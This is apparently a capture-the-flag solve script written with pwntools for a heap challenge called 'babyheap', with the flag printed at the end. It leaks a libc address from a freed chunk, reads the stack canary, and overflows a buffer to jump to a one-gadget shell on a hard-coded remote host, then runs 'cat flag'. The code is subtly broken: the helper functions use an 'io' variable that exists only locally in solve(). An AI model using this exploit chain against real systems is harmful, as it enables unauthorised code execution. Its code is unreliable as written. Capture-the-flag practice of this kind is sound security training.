from pwn import *
import sys


def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


@debug
def write(data, size):
    io.recvuntil(b'>')
    io.sendline(b'1')

    io.recvuntil(b'size :')
    io.sendline(b'%d' % size)

    io.recvuntil(b'data :')
    io.sendline(data)


@debug
def read(index):
    io.recvuntil(b'>')
    io.sendline(b'2')

    io.recvuntil(b'index :')
    io.sendline(b'%d' % index)

    data = io.recvuntil(b'1. ')[:-3]
    return data


@debug
def free(index):
    io.recvuntil(b'>')
    io.sendline(b'3')

    io.recvuntil(b'index :')
    io.sendline(b'%d' % index)


binpath = './babyheap'

context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = "DEBUG"

elf = ELF(binpath)
libc = ELF("./libc.so.6")

gdbscript = '''
gef
b *0x400B1B
# b *0x400b6f
# b *0x40091f
# b *0x400A46
b *0x400aeb
'''

def solve():
    env = {"LD_PRELOAD": "./libc.so.6"}
    # io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
    # io = process(binpath, env=env)
    io = remote("114.177.250.4", 2223)

    write(b'A',0x418)
    write(b'B', 0x28)
    free(0)
    addr_libc = u64(read(0).ljust(8, b'\x00')) - 0x3ebca0
    print('addr_libc = 0x{:x}'.format(addr_libc))
    addr_gadget = addr_libc + 0x4f322

    # gdb.attach(io)

    addr_canary = addr_libc + 0x617528 + 1


    write(p64(addr_canary), 0x28)
    data = b'\x00' + read(1028)[:7]
    print(hexdump(data))
    canary = u64(data)
    print('canary = 0x{:x}'.format(canary))

    payload = b''
    payload += b'C' * 0x108
    payload += p64(canary)
    payload += b'D' * 8 * 3
    payload += p64(addr_gadget)
    write(payload, 0x300)

    io.sendline(b'cat flag')

    io.interactive()



if __name__ == '__main__':
    solve() 

# ctrctf{y0u_und3r5t00d_ab0ut_h34p}
